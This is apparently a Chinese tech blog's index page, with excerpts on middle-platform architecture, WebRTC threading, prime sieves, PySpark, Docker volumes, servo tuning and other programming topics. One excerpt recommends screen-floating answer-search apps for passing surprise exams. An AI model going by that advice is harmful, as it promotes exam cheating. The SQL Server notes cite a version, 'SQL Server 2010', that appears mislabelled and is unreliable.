https://github.com/Mieze/AtherosE2200Ethernet/releases RealtekRTL8111 对于Realtek的千兆以太网要求OS X 10.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/931fcf6dd88f666c8f9cf1ef318cc510/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2e61b87d3338acf16da6b91c5ca53cdf/" rel="bookmark">
			读书 | 数字化转型的道与术（下）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【数字化转型】| 作者 / Edison Zhou
这是EdisonTalk的第313篇学习总结 最近在阅读钟华老师的新作《数字化转型的道与术》，记录和总结了一些学习笔记和感想，整理成文分享与你，本文为下半部分，希望能对也在参与数字化转型的各位童鞋有一点点帮助！
1中台架构的建设思路
业务中台的架构和落地形态
业务中台建设的目标是：实现企业业务数据的实时、统一和在线。下图是一个典型的业务中台：
在落地的时候，需要保持各个服务中心的业务扩展性，这就需要：
代码和数据库完全隔离
仅提供该业务领域的公共能力
仅以服务方式对外提供服务
支持服务中心的独立运营
业务中台和数据中台相辅相成
业务中台和数据中台相辅相成，需要共同构建起企业数据的运营闭环。
例如，想要查看过去一段时间各个地区或者店铺的商品销售情况并生成相应报表，这就需要对交易中心的订单数据和商品中心的商品数据进行组合，如果订单和商品的数量都是百万级，这时进行实时的查询和组合就会出现性能问题。合理的方式是将生成报表的相关服务中心以及前台业务应用的数据同步到统一的数据仓库，再由数据仓库提供的计算和访问接口满足这一类场景的要求。
近年来炙热的大数据已经让各大企业都认识到了大数据的重要性，但是大数据不只是更快的计算能力，一定要让数据作用于实际的业务中，让数据在业务交易和场景中发挥出智能决策、以数据为驱动、优化业务等能力，才能真正为企业创造价值和效益。
中台建设的方式和发展路径
目前企业中台建设的典型方式有三种：
（1）顾旧立新：即最大限度地保护原有IT系统的投资，也不断建设基于中台架构的新系统。缺点是需要让旧系统停止业务需求响应，如果系统切割器较长就会造成较大影响。
（2）平滑迁移：即原有系统中并不需要将所有的功能模块都进行中台架构的改造，而只需要将部分功能接入中台体系中。缺点是这种方式要求企业必须具有强大的技术团队对该迁移系统具备源码级的改造和把控能力。
（3）不破不立：即逐步批量化废除原有系统，重新构建新系统，在开始之初就明确了对哪些旧系统进行替换和改造，并且是在几乎同一时间段内对这些系统进行重构。缺点是项目投入成本高昂，而且对也无需求梳理、项目协同协作和管控等方面提出了较高的要求。
对我在X公司的经历而言，我们采用的不破不立的思想进行着顾旧立新的进程，在核心业务上采取了新建系统的方式，对支撑后台业务采取了继续使用原有IT系统的方式，但以维护为主少量新需求优化。
目前企业中台建设的大体路径可以分为四个阶段，分别是：初期（局部业务领域）、完善发展期（全业务链路）、数据算法驱动业务期（沉淀数据和算法能力）、数字赋能构建生态期（能力对外开放）。
中台建设的风险和挑战
钟华老师说道，一般企业中台建设面临的风险和挑战包括以下几个：
（1）企业高层领导的支持
（2）明确数字化阶段建设的核心和重点
（3）组织共识和合理机制
（4）专业人才的参与
（5）成熟稳定的架构和技术平台
基于中台架构的新业务建设原则
针对企业新建系统类型和建设条件的不同，有以下几种建设模式：
（1）自有技术团队+软件外包人员联合开发模式
（2）引入专业解决方案提供商，遵循中台架构建设
（3）引入商业套件，实现中台服务能力与套件的业务对接
我在X公司时采用的是自有技术团队，然后引入阿里云成熟云服务组件，对接酷家乐等成熟第三方服务及金田豪迈等成熟设备厂商来一起构建自己的数字化平台。
中台架构与微服务的关系
微服务是支撑企业中台服务交互和管控的核心框架，是企业中台的核心技术，而企业中台不仅仅需要技术平台的有效支撑，同时也会涉及组织架构、人才、运营等一系列非技术的调整和优化。
2中台服务设计及平台化运营体系
有了建设思路，还需要落地的方法，具体就是服务中心的设计方法以及运营体系的搭建探索。
中台服务设计
中台架构建设的核心是进行中台业务模型设计，核心方法就是抽象出具有企业级共享价值的业务模型。
首先，需要判断什么样的业务可能成为业务中台的服务中心，书中提到了有四点标准可以供我们参考：
（1）功能和数据具备共享价值
（2）有价值的业务数据不断汇入和沉淀
（3）功能有不断完善和丰富的需求
（4）功能边界清晰，具有独立运营价值
其次，确定了需要建设服务中心的中台业务，就需要将其落地，书中提到了一个落地流程以供我们参考：
（1）调研与规划：从发展角度去看企业当下的业务运营情况和未来的业务规划，需要综合考虑企业自身的特性、新技术应用、新业务发展趋势等方面来做总体规划。
（2）需求分析：从业务规划的各种业务场景出发，梳理核心业务流程，边梳理业务流程边识别业务实体，两者相辅相成。
（3）中台设计：从需求分析到中台设计有两条路径（如上图所示），A是针对业务比较复杂的场景是从业务域分析开始的完整过程（流程分析、时序图分析和聚合分析最后得出方案），B是针对业务比较简单明确的场景是基于模型库或已有的方案开始迭代推演。中台设计一般分为两个阶段：业务中心分析（三个分析：流程分析→聚合分析→时序图分析）和业务中心设计（三个维度：业务模型、数据模型和服务能力）。值得一提的是，DDD（领域驱动设计）的方法论可以用于指导这个阶段的分析和设计工作。
（4）开发实现：开发团队进行详细设计和开发，并没有太多特殊之处，但是需要开发人员掌握分布式、服务化相关的一些开发原则和技术，特别是分布式事务、异步、幂等性等问题。
其次，在落地设计开发实现过程中，也需要遵守一些良好的设计原则和方法：
（1）契约先行：服务契约公开之后就需要保证良好的稳定性，不随便重构；
（2）服务功能内聚：必须将可能影响到业务正确性的逻辑在对应的服务中一起提供；
（3）服务粗粒度：综合考虑粗粒度，减少前端的远程调用此书，降低其学习成本和耦合度。
（4）消除冗余数据：使用DTO等手段避免携带当前业务场景中不需要的冗余字段；
（5）通用契约：参数和返回值必须是被广泛支持的比较简单的数据类型（比如不能有对象的循环引用，不能有某种特定开发语言才具备的高级特性）
（6）隔离变化原则：避免服务中心内部的重构或者模型变更导致前台应用也跟着变化；
（7）契约包装：可以考虑包装远程服务访问的逻辑，也称服务代理（Delegate Service）模式，由消费者端子机主导定义接口和参数类型，并将服务调用转发给真正的服务客户端，从而让服务使用者完全屏蔽服务器月。
（8）服务无状态原则：要保证服务中心的服务稳定性和可靠性，服务不应设计为“有状态型”的，即服务不应依赖服务使用者和服务生产者之间长期存在的关系。
（9）服务命名原则：优先使用业务概念而不是技术概念。
（10）服务操作设计原则：应当使用具体的业务含义而不是泛型操作对操作进行定义。
（11）重要的服务不能依赖非重要的服务：上可以依赖下，下不可依赖上，平级可依赖但需避免循环依赖，高级别不可依赖低级别。
总体来说，简单就是美，这些原则也并非全部使用，需要我们在实践过程中不断练习。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2e61b87d3338acf16da6b91c5ca53cdf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/74020c32c6a39e8090545ee106955be5/" rel="bookmark">
			webrtc线程模型分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
概述
1.ProcessThreadImpl类
2.TaskQueue类
3.Thread类
概述 webrtc是一个跨平台的实时音频通信技术，底层对不同平台的线程接口进行了封装，本文以windows平台为例，简要分析一下其封装的线程类的特点和使用方法。在90版本的webrtc,封装了三个线程相关的类，分别是modules/utility/source/ProcessThreadImpl、rtc_base/TaskQueue、rtc_base/Thread,这三个类创建线程都是通过调用CreateThread函数来实现，webrtc使用线程基本上都是通过这三个类来进行的。
个人感觉webrtc线程类的最大特点就是支持在线程间传递消息处理函数，例如线程A想让线程B干点事情，那么就向线程B发送一个任务，这个任务里面就包含了需要在线程B内执行的消息处理函数，这个处理函数往往是lambda函数（当然也可以是全局的函数）。这种设计最大好处的就是简化了线程间进行通信的方法，而这又是通过lambda函数的参数捕获机制来实现的。举个例子当我们需要向另一个线程传递多个变量的时候，往往都是通过设计多个参数或者定义一个结构体来实现，在传递数据前可能还需要一个个的进行变量赋值，但是通过lambda函数一切就变得简单了，使用lambda函数的捕获列表功能，目标线程处理消息时需要什么参数就可以直接在捕获列表传进去，甚至还可以把this指针也给传进去，然后再在lambda函数内部调用类的成员函数。当然了，使用这种线程通信模型需要十分清楚类的成员变量会在哪些线程被访问、那些地方需要加锁进行保护。
1.ProcessThreadImpl类 ProcessThread线程提供的函数是Start、Stop、WakeUp、RegisterModule、DeRegisterModule，可以向线程注册多个处理模块，这些模块会在线程内被频繁定时调用。ProcessThread主要用于创建需要循环处理消息类型的线程，例如webrtc中就通过ProcessThread创建了PacerThread、ModuleProcessThread线程，其中PacerThread线程用于平滑网络数据包的发送，而ModuleProcessThread用于处理rtp/rtcp消息等。
2.TaskQueue类 TaskQueue主要提供了PostTask、PostDelayedTask接口。PostTask、PostDelayedTask可以将一个lambda函数作为参数传入，在lambda函数内部也可以调用包含lambda函数的函数，这样就看下来一个类的成员函数会被不同的线程所调用，如下面的函数：
void VideoStreamEncoder::OnLossNotification( const VideoEncoder::LossNotification&amp; loss_notification) { if (!encoder_queue_.IsCurrent()) { encoder_queue_.PostTask( [this, loss_notification] { OnLossNotification(loss_notification); }); return; } RTC_DCHECK_RUN_ON(&amp;encoder_queue_); if (encoder_) { encoder_-&gt;OnLossNotification(loss_notification); } } TaskQueue使用了TaskQueueBase类型的实例。TaskQueue没有实现不同线程间的同步调用，PostTask把消息发到目标线程后会立即返回，不会等待目标线程处理完消息，而rtc_base/Thread类的Send/Invoke函数就会等待。
3.Thread类 Thread里面的Send/Invoke函数可以实现两个不同线程之间的同步调用，例如A线程调用B线程的一个函数F，函数F是执行在B线程里面，但是A线程在Invoke后会阻塞，等到B线程执行完F后A线程才继续往下执行。实现原理是在Invoke内部调用了PostTask，在调用PostTask时传入了一个lambda函数，这个lambda函数以引用方式捕获了一个局部变量ready，ready在目标线程执行完消息处理函数后会被设置为true，而调用者线程在PostTask后循环等待ready，只有ready等于true后才结束循环，从而函数返回，这样就实现了以同步方式调用另一个线程的函数。代码如下：
bool ready = false; PostTask( webrtc::ToQueuedTask([msg]() mutable { msg.phandler-&gt;OnMessage(&amp;msg); }, [this, &amp;ready, current_thread] { CritScope cs(&amp;crit_); // 线程B执行 ready = true; current_thread-&gt;socketserver()-&gt;WakeUp(); })); bool waited = false; crit_.Enter(); // 线程A执行 while (!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/74020c32c6a39e8090545ee106955be5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2852cac4bad998e308df370bf5a8a285/" rel="bookmark">
			【数论】 质数知识总结（质数判断、筛选、质因子分解、互质）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一.定义二.质数的判断三.质数的筛选四.质因子分解五.互质 一.定义 质数，又称素数，若一个正整数无法被除了1和它自身以外的其它数整除，则称其为质数，否则为合数。特殊地，1既不是合数也不是质数
二.质数的判断 试除法： 检查所有可能成为n的因子的数，若没有找到因子，则证明这个数是一个质数
一种朴素的做法就是从2遍历到N-1观察有无N的因子，若没有则说明N为质数，依据的想法是N的因子必然在1~N的范围内
改进： 其实我们只要找到一个N的因子（除了1和它本身）就可以证明N是个合数。
定理：如果N是一个合数，则必然存在一个N的因子T，满足 2 ≤ T ≤ √ N 2≤T≤√N 2≤T≤√N
证明：反证法即可
因此我们只需要从2遍历到√N即可，时间复杂度缩小为O（√N）
其它的想法：
素数筛进行预处理，用prime数组存放所有素数，然后从 p r i m e [ 1 ] prime[1] prime[1]遍历到 p r i m e [ i ] ∗ p r i m e [ i ] ≤ N prime[i]*prime[i]≤N prime[i]∗prime[i]≤N，因为N如果是合数，则必然存在小于等于√N的素数因子
证明：前文以经证明过必然存在小于√N的因子，如果这个因子是素数自不必说，如果是合数，那么合数可以被分解为素因子的乘积。
目的：可以进一步减少时间复杂度，需要遍历的数更少了（因为素数的分布相对稀疏，10万以内的素数只有9500多个）
当然这只是我个人的想法，没有仔细的验证与思考，并且大部分时候O（√N）的复杂度就已经很优秀了
三.质数的筛选 筛选：即从1~N中筛选出所有的质数
思路：一个数x的倍数——2x,3x,4x……必然不是素数
具体做法：从2开始扫描所有的数x，并将x的所有倍数标记为合数。如果扫描到一个数y，发现y没被标记过，说明y一定是素数，因为2~y-1没有y的因子，符合素数定义
因为每个合数必然有质因子，所以只让素数来进行标记的工作以减少重复标记，比如27让3来标记为合数即可。
这就是埃氏筛
缺点：有些数仍会被重复标记，比如12既是3的倍数又是2的倍数
改进：
线性筛/欧拉筛：
即找到一个数的唯一产生方式：让一个数的最小质因子对其进行标记，比如12，虽然有2，3两个质因子，但只让2来标记12。
时间复杂度接近 O ( N ) O(N) O(N)，所以称为线性筛
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2852cac4bad998e308df370bf5a8a285/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fa00c2e716b1eb8dc634bb989f91aac7/" rel="bookmark">
			可以悬浮在屏幕的搜题软件_给大家总结几款好用的搜题软件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在学习中，难免会碰到不会做的题，一时想不开解题方法，这就需要搜题软件的帮助了。另外现在很多单位突击考试，让人来不得及准备，如果有好用的搜题软件，那么也能帮自己顺利通过考试，身心愉悦!
搜题软件汇总：
一、优题宝
优题宝是一款除k12考试之外，其他考试均能在线搜题的超实用软件，针对不同场景，提供语音、文字及拍照三种搜题方式。
一键搜索，答案秒出!
如果你在读大学，或想考研、考公，网课，考证等等，你都可以用它在线搜题。
另外优题宝和其他软件区别的一点：它可以分享给他人，分享者可以获取佣金。多分享多得。
二、上学吧找答案
上学吧找答案是款比较有牌子的搜题软件了，能在线搜题又能题库做题，因此深受大家的喜爱。旗下的搜题软件也备受好评。
三、百度作业帮
百度作业帮是一个在线学习的作业软件APP，它最核心的优势所在是可以拍照搜题，解答难题，对于帮助学生提高学习效率很有帮助，这其中还有名师在线辅导的功能，可以让孩子足不出会体验高效的学习方式。
四、小猿搜题
小猿搜题是一款可以帮助中小学生拍照搜题的软件app，操作起来非常简单，只需要简单的拍照即可得到你想要的习题的答案和全面的解析。
五、阿凡提搜题
阿凡题搜题是海南阿凡题科技有限公司旗下的一款教育App。也支持拍照搜题。
它涵盖所有中小学科目，折磨人的数理化，记不住的英语，还有总要背背背的政史地，统统搞定.!
以上就是我给大家整理的具有代表性的搜题软件，希望能帮助到大家。好不好用，只能体验下就知道了。免费还是付费好?在于个人的想法。付费的好用，那也就值当。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/353fea748b35241fda93a1d65b4a3bab/" rel="bookmark">
			DPABI(用于脑成像的数据处理和分析的工具箱)的下载和安装步骤
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 DPABI(用于脑成像的数据处理和分析的工具箱)的下载和安装步骤
下载地址：http://rfmri.org/dpabi安装步骤如下： 把文件夹进行解压，拷贝到MATLAB的toolbox下，在MATLAB的路径设置中添加DPABI的子文件夹，然后在命令窗口中输入“ dpabi ”进行调用。DPABI是GNU / GPL *工具箱，用于脑成像的数据处理和分析，是从DPARSF（静止状态fMRI的数据处理助手）演变而来的，包含DPABISurf 和BrainImageNet。在MATLAB的路径设置中添加DPABI的子文件夹，然后在命令窗口中输入“ dpabi ”以使用此功能强大的工具箱。有关以了解有关如何使用此工具箱的更多信息，请参阅 R-fMRI课程（http://rfmri.org/Course）。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/050db6a7b2b574b0896d4cc29fd64f8f/" rel="bookmark">
			SQL Server 2010 学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SQL Server 2010 学习笔记 SQL Server2010学习笔记（基础篇）1.数据库的创建 SQL Server2010学习笔记（基础篇） 1.数据库的创建 首先数据库的创建其实非常简单，在SQL Server 2010 中提供了两种命令创建的方式：
1.简单方式
create database &lt;数据库名&gt; 简单命令下创建的数据库，数据库文件的大小、数据库的文件存放位置都是默认的设定。这对于普通用户很友好，但是对于一些专业的或者有其他需求的用户并不是很友好，所以在2012中还提供了完整的命令操作。
2.完整格式
create database &lt;数据库名&gt; [on] ([name=&lt;逻辑文件名&gt;, filename=&lt;物理文件名&gt;，//这边物理文件名是具体文件需要存放的文件路径而且同时需要文件的后缀名 size=&lt;初始大小&gt;, maxsize=&lt;文件最大值&gt;, filegrowth=&lt;增大比例&gt;])//在这边有两种方式设置增大比例：普通数值方式/百分比——2MB/2% log on &lt;日志文件&gt; ([name=&lt;逻辑文件名&gt;, filename=&lt;物理文件名&gt;， size=&lt;初始大小&gt;, maxsize=&lt;文件最大值&gt;, filegrowth=&lt;增大比例&gt;]) 在上面代码中需要注意的是：
“[]”:代表可以省略不写，当省略时系统会使用默认值代替。
“&lt;&gt;”:表示不可以省略。
on:表示后面是创建数据库的参数。
log on :表示后面的参数是创建数据库日志文件的参数。
ps：一条命令可以写在多行，但是多条命令不可以写在一行。
在sql server 2012中数据库中至少包含2种文件：一种是数据文件（主文件）、一种是日志文件。
（1）主数据文件：在数据库中主文件是必须要有的，而且只能有一个主数据库文件，它的后缀名为.mdf。
（2）次要文件：可以建立多个，用于不同目地的存放，其扩展名为.ndf.
（3）日志文件：用于存放日志文件，一个数据库中至少有一个日志文件，当然可以建立多个，其后缀名为.ldf。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a28cc8fec92f602c7fd9a5f80f9d1801/" rel="bookmark">
			HTTP状态 500 - 内部服务器错误 类型 异常报告  消息 Servlet[SpringMVC]的Servlet.init（）引发异常  描述 服务器遇到一个意外的情况，阻止它完成请求。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		HTTP状态 500 - 内部服务器错误 类型 异常报告
消息 Servlet[SpringMVC]的Servlet.init（）引发异常
描述 服务器遇到一个意外的情况，阻止它完成请求。
刚学springmvc的时候出现这个问题，本来写网页是一件很美好的事情，结果来了一个500，直接把我心态打垮，这个bug我找了一天，知道哪错了但是就是该不对，网百度一下这个错误，相对来说都是老一套，都只说了片面的东西。
org.springframework.beans.factory.BeanDefinitionStoreException: Failed to read candidate component class: file [C:\Users\Administrator\IdeaProjects\SpringMVC\out\artifacts\SpringMVC_04_annotation_war_exploded\WEB-INF\classes\com\ni\controller\HelloController.class]; nested exception is org.springframework.core.NestedIOException: ASM ClassReader failed to parse class file - probably due to a new Java class file version that isn't supported yet: file [C:\Users\Administrator\IdeaProjects\SpringMVC\out\artifacts\SpringMVC_04_annotation_war_exploded\WEB-INF\classes\com\ni\controller\HelloController.class]; nested exception is java.lang.IllegalArgumentException: Unsupported class file major version 59 根本原因大概意思就是：org.springframework.core.nestedioexception: asm classreader 未能解析类文件——可能是由于新的 java 类文件版，这时候你首先要确保你的项目结构，以及相关配置没有错误。然后才可以定位到你的jdk版本和springmvc版本不匹配，文件解析的时候，没有通过。
翻了好多博客，出现这种错误大多都是jdk1.8和spring 3.1.2，
解决方法：在maven配置文件中降低自己spring的版本，比如说我原来是5.1.9，出错后我降低到4.1.9，问题就解决了。
或者换用别的jdk版本。
以上这种问题很少出现，出现问题不要害怕，多用度娘，你错的多了，以后出现就可以游刃有余的解决了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/79c84f12a0089f565a0fb5834f87fcfd/" rel="bookmark">
			pycharm本地开发pyspark并提交远程执行
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近在学习pyspark的开发，遇到些问题记录下。
我们在开发pyspark时经常需要进行测试，自己电脑上安装搭建一个spark环境代价有点高，目前有的同事在开发时，通常是开发完把代码贴出到本地测试集群进行测试，因此，能不能借助pycharm里的一个功能，连接本地测试集群的pyspark进行执行呢，经过一番搜索终于实现了这一个功能。
新建带有Virtualenv的工程 Virtualenv是什么？
Python 的第三方包成千上万，在一个 Python 环境下开发时间越久、安装依赖越多，就越容易出现依赖包冲突的问题。为了解决这个问题，开发者们开发出了 virtualenv，可以搭建虚拟且独立的 Python 环境。这样就可以使每个项目环境与其他项目独立开来，保持环境的干净，解决包冲突问题。
下面我们先见一个project，在pycharm中默认的是Virtualenv管理环境，当然还有conda，功能和Virtualenv类似。
开发&amp;导入pyspark 新建一个py文件
1 2 3 4 5 6 7 8 9 from pyspark import SparkContext from pyspark.sql import HiveContext APP_NAME = 'APP_TEST' sc = SparkContext(appName=APP_NAME) sqlContext = HiveContext(sc) sqlContext.sql("show databases").show() 引入未安装的包时，pycharm会提示安装，安装需借助pip安装，若为安装pip需先安装，安装完成后会在项目目录：venv/lib/python2.7/site-packages 中出现安装好的第三方库。
至此，我们就可以开发和使用pyspark中的一些文件了。
开发是方便，但是我们还想变开发变测试，由于本地并没有装大数据相关环境，因此，我们还需要做些配置，来远程提交我们的代码并执行测试。
提交远程执行 配置远程project interpreter（程序解释器）
打开pycharm的prefrences配置，从中找到我们项目的project interpreter。
图中展示的是我们本机中导入的程序解释器，我们还可以点击右上方配置按钮，添加远程的程序解释器。
在配置中添加远程服务器的主机ip和用户、密码
在最后一页，可以看到，远程服务器中python的位置。我们在执行程序时，pycharm会自动的将我们的最新代码提交的远程的目录下（/tmp/pycharm_project_237）
当我们切换到远程的project interpreter时，就会看到远程的一些库。我们在开发时，远程服务器缺少哪些库，就需要先到服务器上安装好那些库，之后才可以提交到远程执行，否则会报no module find。
远程执行
上面的配置完成后，就可以在当前文件的Edit Configuration中进行执行配置，在project interpreter选项中可以选择是使用本地的程序解释器还是远程程序解释器执行了。
执行上面定义好的的程序。
可以看出，实际程序执行的是同步到远程服务器的代码。并借助ssh登录到远程服务器执行，并返回执行的结果。
1 ssh://root@node102.bigdata.dmp.local.com:22/usr/bin/python -u /tmp/pycharm_project_568/suishen/uid_to_mongo.py 这样就很方便了，不需要每次边写代码，边复制粘贴进行测试了。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/79c84f12a0089f565a0fb5834f87fcfd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cc88aba4ff8c0a27f39f61f53a5810c9/" rel="bookmark">
			Spark混部集群适配独立Python 用户指南
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题分析 更新时间：2020/10/19 GMT+08:00
说明：
以PySpark任务提交的独立Python包中为ARM版本Python为例说明。集群为x86与ARM的混合部署Spark集群。任务脚本“/opt/test_spark.py”为举例脚本，可用其它PySpark任务替代。test_spark.py脚本内容 # test_spark.py import os import sys from pyspark import SparkContext from pyspark import SparkConf conf = SparkConf() conf.setAppName("get-hosts") sc = SparkContext(conf=conf) def noop(x): import socket import sys return socket.gethostname() + ' '.join(sys.path) + ' '.join(os.environ) rdd = sc.parallelize(range(1000), 100) hosts = rdd.map(noop).distinct().collect() print(hosts) 提交PySpark任务。 PYSPARK_PYTHON=./ANACONDA/mlpy_env/bin/python spark-submit --conf spark.yarn.appMasterEnv.PYSPARK_PYTHON=./ANACONDA/mlpy_env/bin/python --conf spark.executorEnv.PYSPARK_PYTHON=./ANACONDA/mlpy_env/bin/python --master yarn-cluster --archives /opt/mlpy_env.zip#ANACONDA /opt/test_spark.py
分析Spark2 History服务中的任务运行情况。 executors运行情况如下图：
说明： 其中，agent1为x86服务器，agent2为ARM服务器。agent1上运行失败是由于独立Python包中打包的是ARM版本的Python，导致在x86服务器上运行失败。
运行失败executor的错误日志为：
分析archives文件“opt/mlpy_env.zip”流转过程。 任务提交后会将独立Python压缩包上传至HDFS中。 20/07/22 19:00:51 INFO Client: Uploading resource file:/home/mlpy_env.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cc88aba4ff8c0a27f39f61f53a5810c9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4c377845737ec4810f4fd91015f5fb02/" rel="bookmark">
			Docker学习(三)数据卷
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 数据卷
数据卷是一个可以供一个或多个容器使用的特殊目录。
它将宿主机的目录直接映射进容器，并且有以下特点:
1.数据卷 可以在容器之间共享和重用
2.对数据卷的修改会立马生效
3.对数据卷的更新，不会影响镜像
4.数据卷 默认会一直存在，即使容器被删除 #1. 创建数据卷 docker volume create 数据卷名称 #创建之后，默认会存放目录: #/var/lib/docker/volumes/数据卷名称/_data #2. 查看数据卷信息 docker volume inspect 数据卷名称 #3. 查看全部数据卷 docker volume ls #4. 删除数据卷 docker volume rm 数据卷名称 #5. 应用数据卷 #当你映射数据卷时，如果数据卷不存在，docker会自动创建 #方式1. docker run -v 数据卷名称:容器内部路径 镜像id #方式2.直接指定一个路径作为数据卷存放位置 docker run -v 路径:容器内部路径 镜像id 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/10cff8051e9ee86b683ccb6d91f2c75f/" rel="bookmark">
			安川伺服调试软件_安川伺服调试经验（仅供参加）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1、 安川伺服在低刚性(1～4)负载应用时，惯量比显得非常重要，以同步带结构而论，刚性大约在1～2(甚至1以下)，此时惯量比没有办法进行自动调谐，必须使伺服放大器置于不自动调谐状态。 2、 惯量比的范围在450～1600之间(具体视负载而定) 3、 此时的刚性在1～3之间，甚至可以设置到4；但是有时也有可能在1以下。 4、 刚性：电机转子抵抗负载惯性的能力，也就是电机转子的自锁能力，刚性越低，电机转子越软弱无力，越容易引起低频振动，发生负载在到达制定位置后左右晃动；刚性和惯量比配合使用；如果刚性远远高于惯量比匹配的范围，那么电机将发生高频自激振荡，表现为电机发出高频刺耳的声响；这一切不良表现都是在伺服信号(SV-ON)ON并且连接负载的情况下。 5、 发生定位到位后越程，而后自动退回的现象的原因：位置环增益设置的过大，主要在低刚性的负载时有此可能，。 6、 低刚性负载增益的调节： A、 将惯量比设置为600； B、 将Pn110设置为0012；不进行自动调谐 C、 将Pn100和Pn102设置为最小； D、 将Pn101和Pn401设置为刚性为1时的参数 E、 然后进行JOG运行，速度从100～500； F、 进入软件的SETUP中查看实际的惯量比； G、 将看到的惯量比设置到Pn103中； H、 并且自动设定刚性，通常此时会被设定为1； I、 然后将SV－ON至于ON，如果没有振荡的声音，此时进行JOG运行，并且观察是否电机产生振荡；如果有振荡，必须减少Pn100数值，然后重复E、F重新设定转动惯量比；重新设定刚性；注意此时刚性应该是1甚至1以下； J、 在刚性设定到1时没有振荡的情况下，逐步加快JOG速度，并且适当减少Pn305、Pn306(加减速时间)的设定值； K、 在多次800rpm以上的JOG运行中没有振荡情况下进入定位控制调试； L、 首先将定位的速度减少至200rpm以内进行调试 M、 并且在调试过程中不断减少Pn101参数的设定值； N、 如果调试中发生到达位置后负载出现低频振荡现象，此时适当减少Pn102参数的设定值，调整至最佳定位状态； O、 再将速度以100～180rpm的速度 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bcccae22b54773fa14b08a16d782374c/" rel="bookmark">
			Lua踩坑——跨文件调用函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作为lua的新手，目前遇到的第一个小问题，虽然不是个多么深奥复杂的问题，但是给自己开个头吧——记录每一次试错的过程，作为以后的参考；
场景是lua的跨文件调用：
文件1:library.lua
local ecsfunction={} function ecsfunction:test() print("我太帅了") end 文件2：test.lua
local thisTest=require("library") if not thisTest then print("shit") end print("nothing") thisTest:test() 首先，在require中，不能加上后缀名，否则会无法调用：
但是结果是，只会输出“nothing”，同时报错，——attempt to index a boolean value
require函数能把不同模块的代码加载进来。
具体流程参考：https://www.cnblogs.com/sifenkesi/p/3816788.html
但是require本身是一个带有返回值的函数，被调用的文件如果没有返回值，那么会默认返回一个true，即一个布尔值
所以作为被调用的文件，要返回一个具体的table，这样才会被正确的调用。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/97d50091959e0d4a98d259cb769919eb/" rel="bookmark">
			python获取工作日_Python的上一个工作日
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		只需从给定日期减去一天,然后检查日期是否为平日.如果没有,减去另一个,直到你有一个工作日：
from datetime import date, timedelta
def prev_weekday(adate):
adate -= timedelta(days=1)
while adate.weekday() &gt; 4: # Mon-Fri are 0-4
adate -= timedelta(days=1)
return adate
演示：
&gt;&gt;&gt; prev_weekday(date.today())
datetime.date(2012, 8, 20)
&gt;&gt;&gt; prev_weekday(date(2012, 8, 20))
datetime.date(2012, 8, 17)
或者,使用偏移表;没有必要使这个映射,一个元组会做的很好：
_offsets = (3, 1, 1, 1, 1, 1, 2)
def prev_weekday(adate):
return adate - timedelta(days=_offsets[adate.weekday()])
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5f2bd96532b4d4f6475d20c0d8d13849/" rel="bookmark">
			ue4离线文档_【UE4烘焙】完美的烘焙效果，应该怎样配置环境设置灯光参数？这些你都知道吗？...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天是2020年11月23日 星期一
正文共：6560字 64图 预计阅读时间17分
上一期我们认识了基本灯光以及参数那么接下来我们就实际使用下，看下场景中是如何设置参数之间如何配合才能烘焙出更好的效果。
首先我们先创建一个场景，对场景进行一个基本配置
后处理 【明度色彩相关的后处理】 举例说明： UE4的空场景中是有默认的后处理场存在的，将镜头摇下来，对准地面能看到自动曝光的变化过程【如下所示】：
